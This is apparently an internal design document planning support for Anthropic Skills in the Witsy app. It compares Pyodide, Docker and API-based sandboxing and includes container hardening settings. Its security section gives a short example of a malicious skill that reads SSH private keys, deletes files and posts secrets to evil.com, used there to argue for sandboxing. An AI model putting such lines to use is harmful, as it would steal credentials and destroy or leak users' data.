# Anthropic Skills Support in Witsy

## Overview

This document outlines the research, architecture, and implementation plan for supporting Anthropic Skills in Witsy.

## What Are Skills?

**Skills** are portable, task-specific folders containing instructions, scripts, and resources that Claude loads dynamically when needed. They extend Claude's capabilities for specialized tasks in a repeatable, composable way.

### Key Characteristics
- **Composable**: Multiple skills can be used together (up to 8 per request)
- **Portable**: Same format works across Claude.ai, Claude Code, and Claude API
- **Context-aware**: Claude automatically loads skills only when relevant to the task
- **Efficient**: Only loads minimal necessary information
- **Powerful**: Can include executable code for reliable task completion

### Skill Structure

Skills are folder-based with a standardized format:

```
my-skill/
├── SKILL.md              # Required: Instructions + metadata
├── scripts/              # Optional: Helper scripts (Python, bash, etc.)
│   └── helper.py
└── examples/             # Optional: Templates, example data
    └── template.md
```

**SKILL.md Format:**
```yaml
---
name: my-skill-name
description: "Clear description of what this skill does and when to use it"
---

# Detailed Instructions

[Markdown content with step-by-step instructions, examples, best practices]
```

## Skills vs Experts vs Agents vs Tools

| Concept | What it is | When to use |
|---------|-----------|-------------|
| **Tool** | Discrete capability (function call) | Single-shot operations |
| **Expert** | Custom personality/prompt template | Customize chat behavior |
| **Agent** | Multi-step workflow with tools | Complex tasks requiring planning |
| **Skill** | **Portable instruction set + code** | **Reusable specialized capabilities** |

### Skills Are Unique Because:
- They combine **instructions (like Experts)** + **execution (like Tools)** + **composability (like Agents)**
- They're **portable** (same format across apps)
- They're **discoverable** (ecosystem of community skills)
- They're **dynamic** (LLM decides when to load them)

## How Skills Work

### Execution Model

Skills are NOT just text instructions - they're **mini filesystems** that Claude accesses dynamically:

1. **Skill Discovery**: Claude sees skill metadata (~100 tokens)
2. **Skill Loading**: When relevant, Claude reads SKILL.md via bash
3. **Script Execution**: Claude runs helper scripts WITHOUT reading them into context
4. **Dynamic File Access**: Claude can explore the skill folder with bash commands

**Example:**
```bash
# Claude reads instructions
cat /path/to/skills/webapp-testing/SKILL.md

# Claude lists available scripts
ls scripts/

# Claude runs helper (code never enters context, only output)
python scripts/with_server.py --server "npm run dev" --port 5173 -- python test.py
```

### Required Capabilities

Skills need access to:

| Capability | Why | Witsy Status |
|------------|-----|--------------|
| **Bash/Shell** | Navigate files, run scripts | ❌ Not available |
| **Python Execution** | Complex logic and data processing | ✅ Available (native + Pyodide) |
| **File Read/Write** | Access skill files, save outputs | ✅ Available (filesystem plugin) |
| **Web Fetching** | Download documentation, data | ✅ Available (browse plugin) |
| **Search** | Research APIs, gather info | ✅ Available (search plugin) |
| **Image Generation** | Create visuals | ✅ Available (image plugin) |
| **Package Installation** | Install Python/npm packages | ❌ Not available |

**Critical Gap:** Skills assume bash access for file operations and script execution.

## Security: Sandboxing is MANDATORY

### Why Sandboxing is Critical

Skills execute **arbitrary code from untrusted sources** (community repo, user-created). Without sandboxing:

```python
# Malicious skill could:
open('/Users/you/.ssh/id_rsa').read()  # Steal SSH keys
import os; os.remove('/important/file')  # Delete files
import requests; requests.post('evil.com', data=secrets)  # Exfiltrate data
```

**Skills MUST run in an isolated sandbox.**

### Current Witsy Python Execution

| Runtime | Sandboxed? | Security Level | Use Case |
|---------|-----------|----------------|----------|
| **Native Python** (main branch) | ❌ NO | **DANGEROUS** | Full system access |
| **Pyodide** (sandbox branch) | ✅ YES | **SAFE** | WASM sandbox, no filesystem/network |

### The Pyodide Limitation

Pyodide provides excellent sandboxing but **cannot run bash**:
- ✅ Executes Python in WASM sandbox
- ✅ Isolated from host system
- ✅ No network access
- ✅ No host filesystem access
- ❌ **Cannot execute bash commands**
- ❌ **Cannot run shell scripts**

**Problem:** Real Anthropic skills heavily rely on bash (ls, cat, python script.py, etc.)

## Implementation Options

### Option 1: Python-Only Skills (Pyodide)

**Description:** Support simplified skills that only use Python, no bash.

**How it Works:**
- Skills embed Python code directly in SKILL.md
- No separate script files
- Use Pyodide sandbox for execution
- Works with any LLM provider that supports function calling

**Pros:**
- ✅ Fully sandboxed (Pyodide WASM)
- ✅ Cross-platform
- ✅ No external dependencies
- ✅ Secure by default
- ✅ Multi-provider support

**Cons:**
- ❌ Not compatible with Anthropic skill repo
- ❌ No bash support
- ❌ Limited to Python-only operations
- ❌ Can't use multi-file skill structures

**Example Simplified Skill:**
```markdown
---
name: data-analyzer
description: Analyze CSV data
---

# Instructions

To analyze data, execute this Python code:

```python
import pandas as pd

# Analysis code embedded in SKILL.md
data = pd.read_csv('/tmp/data.csv')
print(data.describe())
```
```

---

### Option 2: Full Skills via Docker

**Description:** Run skills in Docker containers with complete bash + Python support.

**How it Works:**
- Create Docker image with Python + bash + common packages
- Mount skill folder into container (read-only)
- Execute skills in isolated containers
- Full compatibility with Anthropic skills

**Architecture:**

```
┌─────────────────────────────────────────────────────────────┐
│ Witsy (Electron Main Process)                               │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐  │
│  │ Host Filesystem                                      │  │
│  │  /Users/you/witsy/                                   │  │
│  │    skills/                                           │  │
│  │      webapp-testing/                                 │  │
│  │        SKILL.md                                      │  │
│  │        scripts/helper.py                             │  │
│  └──────────────────────────────────────────────────────┘  │
│                            │                                 │
│                            │ Mount read-only                 │
│                            ↓                                 │
│  ┌──────────────────────────────────────────────────────┐  │
│  │ Docker Container (Isolated)                         │  │
│  │                                                      │  │
│  │  Mounted: /skill/                                   │  │
│  │    SKILL.md                                         │  │
│  │    scripts/helper.py                                │  │
│  │                                                      │  │
│  │  Bash Execution:                                     │  │
│  │    $ cat SKILL.md                                   │  │
│  │    $ python scripts/helper.py                       │  │
│  │                                                      │  │
│  │  Security:                                           │  │
│  │    ✅ No network access (NetworkMode: none)         │  │
│  │    ✅ Read-only filesystem                          │  │
│  │    ✅ Resource limits (CPU/RAM)                     │  │
│  │    ✅ Non-root user                                 │  │
│  └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

**Dependencies:**

```dockerfile
# skills-runtime.dockerfile
FROM python:3.11-slim

RUN apt-get update && apt-get install -y \
    bash curl git \
    && rm -rf /var/lib/apt/lists/*

RUN pip install --no-cache-dir \
    pandas numpy pillow matplotlib openpyxl \
    requests playwright

RUN playwright install chromium --with-deps

WORKDIR /skill
RUN useradd -m -u 1000 skillrunner
USER skillrunner

CMD ["/bin/bash"]
```

**NPM Dependencies:**
```json
{
  "dependencies": {
    "dockerode": "^4.0.2",
    "tar-stream": "^3.1.7"
  }
}
```

**Container Security:**
```typescript
const securityConfig = {
  NetworkMode: 'none',              // ❌ No network
  ReadonlyRootfs: true,             // ✅ Read-only filesystem
  Binds: [`${skillPath}:/skill:ro`], // ✅ Skill folder read-only
  Memory: 512 * 1024 * 1024,        // ✅ 512MB RAM limit
  CpuQuota: 50000,                  // ✅ 50% CPU limit
  PidsLimit: 100,                   // ✅ Max 100 processes
  User: '1000:1000',                // ✅ Non-root user
  CapDrop: ['ALL'],                 // ✅ No capabilities
  SecurityOpt: ['no-new-privileges'] // ✅ No privilege escalation
}
```

**Pros:**
- ✅ Full Anthropic skill compatibility
- ✅ Complete bash + Python support
- ✅ True isolation (container)
- ✅ Can run any skill from Anthropic repo
- ✅ Supports multi-file skill structures

**Cons:**
- ❌ Complex user setup (must install Docker/Colima/OrbStack)
- ❌ Large disk space (~500MB-1GB runtime + images)
- ❌ RAM overhead (~500MB-2GB for Docker daemon)
- ❌ Cold start delay (5-10s container startup)
- ❌ Platform-specific setup differences
- ❌ ~6-8 weeks implementation time

**User Requirements:**

| Platform | Container Runtime Options | Size |
|----------|--------------------------|------|
| macOS | Docker Desktop, Colima, OrbStack | 100-500MB |
| Windows | Docker Desktop, Rancher Desktop | 400-500MB |
| Linux | Docker, Podman, containerd | 50-100MB |

**Implementation:**
```typescript
// src/main/docker.ts
import Docker from 'dockerode'

export class DockerSkillRuntime {
  private docker: Docker

  async executeSkill(
    skillPath: string,
    command: string,
    timeout: number = 60000
  ): Promise<{ stdout: string; stderr: string; exitCode: number }> {

    const container = await this.docker.createContainer({
      Image: 'witsy-skill-runtime:latest',
      Cmd: ['/bin/bash', '-c', command],
      WorkingDir: '/skill',
      HostConfig: {
        Binds: [`${skillPath}:/skill:ro`],
        NetworkMode: 'none',
        Memory: 512 * 1024 * 1024,
        CpuQuota: 50000,
        AutoRemove: true,
        ReadonlyRootfs: true,
        Tmpfs: { '/tmp': 'rw,noexec,nosuid,size=100m' }
      }
    })

    await container.start()

    const timeoutHandle = setTimeout(async () => {
      await container.kill()
    }, timeout)

    try {
      const result = await container.wait()
      const logs = await container.logs({ stdout: true, stderr: true })

      return this.parseLogs(logs, result.StatusCode)
    } finally {
      clearTimeout(timeoutHandle)
    }
  }
}
```

**Skill Plugin:**
```typescript
// src/plugins/skill.ts
export default class SkillPlugin extends Plugin {
  skillPath: string
  skillDef: SkillDefinition
  runtime: DockerSkillRuntime

  async execute(context: PluginExecutionContext, parameters: anyDict) {
    if (!await this.runtime.isAvailable()) {
      return {
        error: 'Docker is not available. Please install Docker Desktop, Colima, or another container runtime.'
      }
    }

    const command = this.buildSkillCommand(parameters)

    const result = await this.runtime.executeSkill(
      this.skillPath,
      command,
      60000
    )

    if (result.exitCode !== 0) {
      return { error: result.stderr, stdout: result.stdout }
    }

    return { result: result.stdout }
  }
}
```

**Distribution Options:**
- Build image locally (5-10 min first time)
- Pull pre-built from Docker Hub (faster, recommended)

---

### Option 3: Anthropic API Only

**Description:** Use Anthropic's native Skills API for Anthropic models only.

**How it Works:**
- Upload skills to Anthropic via `/v1/skills` API
- Skills execute in Anthropic's infrastructure
- No local execution or sandboxing needed

**Pros:**
- ✅ Fully sandboxed (Anthropic handles it)
- ✅ Complete bash support
- ✅ No Witsy security concerns
- ✅ Access to Anthropic's pre-built skills
- ✅ No local dependencies

**Cons:**
- ❌ Only works with Anthropic models
- ❌ Requires internet connection
- ❌ No custom skills without uploading
- ❌ API costs
- ❌ No local/private skills

**API Integration:**
```typescript
// Use Anthropic's container parameter in Messages API
const response = await anthropic.messages.create({
  model: 'claude-3-5-sonnet-20241022',
  max_tokens: 1024,
  messages: [{ role: 'user', content: 'Use the xlsx skill to analyze data.csv' }],
  container: {
    type: 'custom',
    id: 'skill_01AbCdEfGhIjKlMnOpQrStUv',
    version: '20251013'
  },
  betas: ['skills-2025-10-02', 'code-execution-2025-08-25']
})
```

---

### Option 4: Hybrid Approach

**Description:** Support multiple tiers based on available resources.

**How it Works:**
1. **Tier 1 (Always)**: Instruction-only skills (like enhanced Experts)
2. **Tier 2 (If Pyodide)**: Python-only skills via Pyodide sandbox
3. **Tier 3 (If Docker)**: Full skills via Docker containers
4. **Tier 4 (If Anthropic API)**: Native Anthropic skills

**Pros:**
- ✅ Progressive enhancement
- ✅ Works for everyone (Tier 1 minimum)
- ✅ Power users get full features (Tiers 3-4)
- ✅ Flexible deployment

**Cons:**
- ❌ Complex implementation (4 execution paths)
- ❌ Skill compatibility matrix
- ❌ Testing complexity

---

## Recommended Approach

### Phase 1: Start with Docker (Full Skill Support)

**Rationale:**
- Provides complete Anthropic skill compatibility
- True sandboxing with full bash support
- Clear security boundaries
- Can import skills from Anthropic repo directly

**Prerequisites:**
- Merge `sandboxed-code-execution` branch (for Pyodide fallback)
- User installs Docker/Colima/OrbStack

**Timeline:**
- Week 1-2: Docker runtime integration + container image
- Week 3-4: Skill plugin implementation + security hardening
- Week 5-6: UI/UX (setup wizard, status indicators, error handling)
- Week 7-8: Testing, documentation, optimization

**Deliverables:**
1. Docker runtime manager (detect, connect, execute)
2. Pre-built skill runtime image (Docker Hub)
3. Skill plugin (mount folders, execute in containers)
4. Setup wizard (guide users through Docker installation)
5. Settings UI (enable/disable skills, manage Docker)
6. Security boundaries (network isolation, resource limits)
7. Documentation (install guide, troubleshooting, security model)

### Phase 2: Fallback to Pyodide (Python-Only Skills)

**For users without Docker:**
- Detect if Docker is unavailable
- Offer simplified Python-only skills
- Use Pyodide sandbox
- Less capable but still useful

---

## Security Model

### Skills Can Do (Safe):
- ✅ Read files from their skill folder
- ✅ Execute bash commands (in container)
- ✅ Run Python scripts
- ✅ Create temporary files in `/tmp` (memory-only)
- ✅ Use pre-installed packages

### Skills Cannot Do (Blocked):
- ❌ Access network (NetworkMode: none)
- ❌ Read host filesystem (only mounted skill folder, read-only)
- ❌ Modify skill folder (mounted read-only)
- ❌ Escape container (standard Docker isolation)
- ❌ Use excessive resources (CPU/RAM/PID limits)
- ❌ Run indefinitely (60 second timeout)
- ❌ Gain privileges (non-root user, dropped capabilities)

---

## Skill Discovery & Management

### Skill Registry

```typescript
// Store skills per workspace
{workspaceDir}/
  skills/
    algorithmic-art/
      SKILL.md
      examples/
    webapp-testing/
      SKILL.md
      scripts/
        with_server.py
    my-custom-skill/
      SKILL.md
```

### Skill Sources

1. **Anthropic Official Repo**: https://github.com/anthropics/skills
2. **Community Skills**: GitHub, skill marketplaces
3. **User-Created**: Local skill folders
4. **Imported**: Import from folder/Git repo

### UI Features

- **Browse Skills**: List available skills from Anthropic repo
- **Import Skill**: Import from folder or Git URL
- **Enable/Disable**: Toggle skills per workspace
- **Skill Settings**: Configure skill-specific parameters
- **Docker Status**: Show runtime availability, guide installation

---

## Open Questions

1. **Multi-provider support**: Should we invest in making skills work with non-Anthropic models?
   - Docker approach is provider-agnostic
   - LLM needs to understand how to use bash/Python to execute skills

2. **Skill compatibility**: Should we curate/test skills from Anthropic repo?
   - Not all skills may work perfectly in Witsy
   - May need skill-specific adapters

3. **Package management**: How to handle skills requiring custom packages?
   - Pre-install common packages in Docker image
   - Allow per-skill package installation?
   - Security implications of `pip install` in containers

4. **Performance**: How to optimize container startup time?
   - Container pooling (pre-warmed containers)
   - Image caching
   - Lazy image pulling

5. **Offline support**: Should skills work offline?
   - Docker images can be cached
   - Skills themselves are local files
   - But initial image pull requires internet

---

## References

- [Anthropic Skills Announcement](https://www.anthropic.com/news/skills)
- [Anthropic Skills Repository](https://github.com/anthropics/skills)
- [Skills API Documentation](https://docs.claude.com/en/api/skills-guide)
- [Agent Skills Overview](https://docs.claude.com/en/docs/agents-and-tools/agent-skills/overview)
- [Skills Best Practices](https://docs.claude.com/en/docs/agents-and-tools/agent-skills/best-practices)

---

## Decision Log

### 2025-01-XX: Initial Research
- Investigated Anthropic Skills architecture
- Analyzed skill requirements (bash, Python, files)
- Evaluated sandboxing options (Pyodide, Docker, WASI)
- Identified Pyodide limitation (no bash support)

### 2025-01-XX: Docker Evaluation
- Researched Docker integration with Electron
- Designed container security model
- Prototyped execution architecture
- Estimated implementation timeline (6-8 weeks)

### Next: Architecture Decision
- Choose implementation approach (Docker, Pyodide, Hybrid, API-only)
- Define MVP scope
- Create detailed implementation plan
